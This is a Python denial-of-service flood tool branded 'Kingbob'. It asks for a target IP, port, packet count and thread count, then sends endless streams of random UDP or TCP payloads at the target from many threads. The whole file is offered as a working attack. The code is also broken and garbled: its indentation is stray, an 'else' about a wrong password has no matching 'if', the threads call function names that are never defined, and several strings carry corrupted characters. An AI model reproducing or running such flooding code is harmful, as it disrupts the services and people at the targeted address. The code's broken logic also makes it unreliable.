import random
import socket
import threading
import os, sys
import time
  os.system("clear")
  print("\033[1;34;40m=>Build By Kingbob<=")
  time.sleep(1)
  print("\033[1;34;40m=>YT KINGBOB<=")
  time.sleep(3)
  os.system("clear")
  print('''\033[1;36;40m
                                                    
------------------------------------------------------------------                                                                  
@@@  @@@  @@@  @@@  @@@   @@@@@@@@  @@@@@@@    @@@@@@   @@@@@@@   
@@@  @@@  @@@  @@@@ @@@  @@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  !@@  @@!  @@!@!@@@  !@@        @@!  @@@  @@!  @@@  @@!  @@@  
!@!  @!!  !@!  !@!!@!@!  !@!        !@   @!@  !@!  @!@  !@   @!@  
@!@@!@!   !!@  @!@ !!@!  !@! @!@!@  @!@!@!@   @!@  !@!  @!@!@!@   
!!@!!!    !!!  !@!  !!!  !!! !!@!!  !!!@!!!!  !@!  !!!  !!!@!!!!  
!!: :!!   !!:  !!:  !!!  :!!   !!:  !!:  !!!  !!:  !!!  !!:  !!!  
:!:  !:!  :!:  :!:  !:!  :!:   !::  :!:  !:!  :!:  !:!  :!:  !:!  
 ::  :::   ::   ::   ::   ::: ::::   :: ::::  ::::: ::   :: ::::  
 :   :::  :    ::    :    :: :: :   :: : ::    : :  :   :: : ::   
------------------------------------------------------------------                                                                      
                                                                      ''')
  
  choice = str(input("\033[1;31;40mAttack Methods (Udp/Tcp) \033[1;31;40m<===> "))
  ip = str(input("\033[1;31;40mIp Target \033[1;31;40m<===> "))
  port = int(input("\033[1;31;40mPort Target \033[1;31;40m<===> "))
  times = int(input("\033[1;31;40mEnter Packets \033[1;31;40m<===> "))
  threads = int(input("\033[1;31;40mEnter Threads \033[1;31;40m<===> "))
  def xxbr():
  	data = random._urandom(1050)
  	while True:
  		try:
  			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  			addr = (str(ip),int(port))
  			for x in range(times):
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  				s.sendto(data,addr)
  			print("\033[1;36;40m[â€¢]KINGBOB Attack This Ip %s Port %s"%(ip,port))
  		except:
  			print("\033[1;31;40mÃ— Warning!")
  
  def xxbr2():
  	data = random._urandom(102400)
  	while True:
  		try:
  			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  			s.connect((ip,port))
  			s.send(data)
  			for x in range(times):
  				s.send(data)
  			print("\033[1;36;40m[â€¢]KINGBOBAttack This Ip %s Port %s"%(ip,port))
  		except:
  			s.close()
  			print("\033[1;31;40mÃ— Warning!")
              
  for y in range(threads):
  	if choice == 'Udp':
  		th = threading.Thread(target = KINGBOBAttack)
  		th.start()
  	elif choice == 'Tcp':
  		th = threading.Thread(target = KINGBOBAttack2)
  		th.start()
  		th.start()
else:
  print("\033[1;31;40m[!] Wrong Password!")
